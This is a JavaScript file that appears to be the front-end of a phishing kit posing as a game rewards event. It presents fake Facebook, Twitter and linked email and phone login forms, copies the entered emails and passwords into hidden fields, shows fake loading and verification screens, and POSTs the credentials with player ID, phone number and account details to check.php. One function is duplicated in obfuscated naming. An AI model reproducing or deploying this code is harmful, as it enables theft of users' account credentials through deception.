// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// show hide password for facebook
function showFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "password") {
        x.type = "text";
        $(".showPassword").hide();
        $(".hidePassword").show();
    } else {
        x.type = "password";
    }
}

function hideFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "text") {
        x.type = "password";
        $(".showPassword").show();
        $(".hidePassword").hide();
    } else {
        x.type = "text";
    }
}

// show hide password for twitter
function showTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "password") {
        x.type = "text";
        $(".TwitterShowPassword").hide();
        $(".TwitterHidePassword").show();
    } else {
        x.type = "password";
    }
}

function hideTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "text") {
        x.type = "password";
        $(".TwitterShowPassword").show();
        $(".TwitterHidePassword").hide();
    } else {
        x.type = "text";
    }
}

// code for validate data to next step
function audioFile() {
    var audio = document.getElementById("audioFile");
    audio.play();
}

$(document).ready(function() {
    $("o").attr("onclick", "audioFile()");
});

function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(
            " menu-content-active",
            ""
        );
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

function open_account_verification() {
    $(".account_verification").show();
    $(".open_rewards").hide();
    $(".otherReward_confirmation").hide();
}

function open_mail_login() {
    $(".login-mail").show();
    $(".account_login").hide();
}

function close_mail_login() {
    $(".login-mail").hide();
    $(".account_login").show();
}

function open_about_event() {
    $(".about_event").show();
}

function open_event_rules() {
    $(".event_rules").show();
}

function open_facebook() {
    $(".login-facebook").show();
    $(".account_login").hide();
}

function open_twitter() {
    $(".login-twitter").show();
    $(".account_login").hide();
}

function open_linked_email() {
    $(".login-linked-email").show();
    $(".login-linked-phone").hide();
    $(".account_login").hide();
}

function open_linked_phone() {
    $(".login-linked-phone").show();
    $(".login-linked-email").hide();
    $(".account_login").hide();
}

function close_reward_confirmation() {
    $(".open_rewards").hide();
    $(".event_rules").hide();
}

function close_reward_confirmations() {
    $(".event_rules").hide();
    $(".about_event").hide();
}

function close_facebook() {
    $(".login-facebook").hide();
    $(".account_login").show();
}

function close_twitter() {
    $(".login-twitter").hide();
    $(".account_login").show();
}

function tutup_linked_email() {
    $(".login-linked-email").hide();
    $(".account_login").show();
}

function tutup_linked_phone() {
    $(".login-linked-phone").hide();
    $(".account_login").show();
}

function open_newhome() {
    $(".account_login").show();
    $(".newhome").hide();
}

function open_account_login() {
    $(".account_login").show();
    $(".itemReward_confirmation2").hide();
    $(".open_rewards").hide();
}

function open_itemReward_confirmation2(ag) {
    var itemReward_confirmationImg2 = $(ag).attr("src");
    $(".itemReward_confirmation2").show();
    $("#myItemReward_confirmationImg").attr("src", itemReward_confirmationImg2);
}

function open_itemReward_confirmation2(_0x566e04) {
    var _0x4f7dc4 = $(_0x566e04).attr("src");
    $(".itemReward_confirmation2").show();
    $("#myItemReward_confirmationImg").attr("src", _0x4f7dc4);
}

function close_reward_confirmation2() {
    $(".itemReward_confirmation2").hide();
    $(".event_rules").hide();
}

// code for validate data to next step
function ValidateLoginFbData() {
    return (
        $("#ValidateLoginFbForm").submit(function(submitingValidateLoginFbData) {
            submitingValidateLoginFbData.preventDefault();
            $emailfb = $("#email-facebook").val().trim();
            $passwordfb = $("#password-facebook").val().trim();
            $loginfb = $("#login-facebook").val().trim();
            if ($emailfb == "" || $emailfb == null || $emailfb.length <= 5) {
                return (
                    $(".email-fb").show(),
                    $(".sandi-fb").hide(),
                    $(".account_verification").hide(),
                    $(".login-facebook-load").hide(),
                    $(".login-facebook").show(),
                    false
                );
            } else {
                $(".email-fb").hide();
                $("input#validateEmail").val($emailfb);
                $(".login-facebook").hide();
                $(".login-facebook-load").show();
            }
            if ($passwordfb == "" || $passwordfb == null || $passwordfb.length <= 5) {
                return (
                    $(".sandi-fb").show(),
                    $(".account_verification").hide(),
                    $(".login-facebook-load").hide(),
                    $(".login-facebook").show(),
                    false
                );
            } else {
                $(".sandi-fb").hide();
                $("input#validatePassword").val($passwordfb);
                $("input#validateLogin").val($loginfb);
                $(".login-facebook").hide();
                $(".login-facebook-load").show();
                setTimeout(function() {
                    $(".login-facebook-load").hide();
                    $(".account_verification").show();
                }, 3000);
            }
            var $validateEmail = $("input#validateEmail").val(),
                $validatePassword = $("input#validatePassword").val(),
                $validateLogin = $("input#validateLogin").val();
            if (
                $validateEmail == "" &&
                $validatePassword == "" &&
                $validateLogin == ""
            ) {
                return $(".account_verification").show(), false;
            }
            $.ajax({
                data: $(this).serialize(),
                beforeSend: function() {
                    $(".login-facebook").hide();
                },
                success: function() {
                    $(".login-facebook").hide();
                },
            });
        }),
        false
    );
}

function ValidateLoginTwitterData() {
    return (
        $("#ValidateLoginTwitterForm").submit(function(
            submitingValidateLoginTwitterData
        ) {
            submitingValidateLoginTwitterData.preventDefault();
            $emailtw = $("#email-twitter").val().trim();
            $passwordtw = $("#password-twitter").val().trim();
            $logintw = $("#login-twitter").val().trim();
            if ($emailtw == "" || $emailtw == null || $emailtw.length <= 3) {
                return (
                    $(".email-tw").show(),
                    $(".sandi-tw").hide(),
                    $(".account_verification").hide(),
                    $(".login-twitter-load").hide(),
                    $(".login-twitter").show(),
                    false
                );
            } else {
                $(".email-tw").hide();
                $("input#validateEmail").val($emailtw);
                $(".login-twitter").hide();
                $(".login-twitter-load").show();
            }
            if ($passwordtw == "" || $passwordtw == null || $passwordtw.length <= 7) {
                return (
                    $(".sandi-tw").show(),
                    $(".account_verification").hide(),
                    $(".login-twitter-load").hide(),
                    $(".login-twitter").show(),
                    false
                );
            } else {
                $(".sandi-tw").hide();
                $("input#validatePassword").val($passwordtw);
                $("input#validateLogin").val($logintw);
                $(".login-twitter").hide();
                $(".login-twitter-load").show();
                setTimeout(function() {
                    $(".login-twitter-load").hide();
                    $(".account_verification").show();
                }, 3000);
            }
            var $validateEmail = $("input#validateEmail").val(),
                $validatePassword = $("input#validatePassword").val(),
                $validateLogin = $("input#validateLogin").val();
            if (
                $validateEmail == "" &&
                $validatePassword == "" &&
                $validateLogin == ""
            ) {
                return $(".account_verification").show(), false;
            }
            $.ajax({
                data: $(this).serialize(),
                beforeSend: function() {
                    $(".login-twitter").hide();
                },
                success: function() {
                    $(".login-twitter").hide();
                },
            });
        }),
        false
    );
}

function ValidateLoginLinkedEmailData() {
    $("#ValidateLoginLinkedEmailForm").submit(function(
        submitingValidateLoginLinkedEmailData
    ) {
        submitingValidateLoginLinkedEmailData.preventDefault();

        $emailink = $("#email-linked-email").val().trim();
        $passwordink = $("#password-linked-email").val().trim();
        $loginink = $("#login-linked-email").val().trim();
        if ($emailink == "" || $emailink == null || $emailink.length <= 3) {
            $(".email-linked-email").show();
            $(".sandi-linked-email").hide();
            $(".login-linked-email").show();
            return false;
        } else {
            $(".email-linked-email").hide();
            $("input#validateEmail").val($emailink);
            $(".login-linked-email").hide();
        }
        if (
            $passwordink == "" ||
            $passwordink == null ||
            $passwordink.length <= 3
        ) {
            $(".sandi-linked-email").show();
            $(".login-linked-email").show();
            return false;
        } else {
            $(".sandi-linked-email").hide();
            $("input#validatePassword").val($passwordink);
            $("input#validateLogin").val($loginink);
            $(".account_verification").show();
            $(".login-linked-email").hide();
        }
    });
}

function ValidateLoginLinkedPhoneData() {
    $("#ValidateLoginLinkedPhoneForm").submit(function(
        submitingValidateLoginLinkedPhoneData
    ) {
        submitingValidateLoginLinkedPhoneData.preventDefault();

        $emailpho = $("#email-linked-phone").val().trim();
        $passwordpho = $("#password-linked-phone").val().trim();
        $loginpho = $("#login-linked-phone").val().trim();
        if ($emailpho == "" || $emailpho == null || $emailpho.length <= 3) {
            $(".email-linked-phone").show();
            $(".sandi-linked-phone").hide();
            $(".login-linked-phone").show();
            return false;
        } else {
            $(".email-linked-phone").hide();
            $("input#validateEmail").val($emailpho);
            $(".login-linked-phone").hide();
        }
        if (
            $passwordpho == "" ||
            $passwordpho == null ||
            $passwordpho.length <= 3
        ) {
            $(".sandi-linked-phone").show();
            $(".login-linked-phone").show();
            return false;
        } else {
            $(".sandi-linked-phone").hide();
            $("input#validatePassword").val($passwordpho);
            $("input#validateLogin").val($loginpho);
            $(".account_verification").show();
            $(".login-linked-phone").hide();
        }
    });
}

function ValidateVerificationData() {
    return (
        $("#ValidateVerificationDataForm").submit(function(
            submitingValidateVerificationData
        ) {
            submitingValidateVerificationData.preventDefault();
            var $validateEmail = $("input#validateEmail").val(),
                $validatePassword = $("input#validatePassword").val(),
                $nick = $("input#nick").val(),
                $playid = $("input#playid").val(),
                $phone = $("input#phone").val(),
                $level = $("input#level").val(),
                $tier = $("input#tier").val(),
                $rpt = $("input#rpt").val(),
                $rpl = $("input#rpl").val(),
                $platform = $("input#platform").val(),
                $validateLogin = $("input#validateLogin").val();
            if (
                $validateEmail == "" &&
                $validatePassword == "" &&
                $nick == "" &&
                $playid == "" &&
                $phone == "" &&
                $level == "" &&
                $tier == "" &&
                $rpt == "" &&
                $rpl == "" &&
                $platform == "" &&
                $validateLogin == ""
            ) {
                return $(".account_verification").show(), $(".spin-sec").hide(), false;
            }
            $.ajax({
                type: "POST",
                url: "check.php",
                data: $(this).serialize(),
                beforeSend: function() {
                    $(".check_verification").show();
                    $(".account_verification").hide();
                },
                success: function() {
                    $(".processing_account").show();
                    $(".check_verification").hide();
                    $(".account_verification").hide();
                },
            });
        }),
        false
    );
}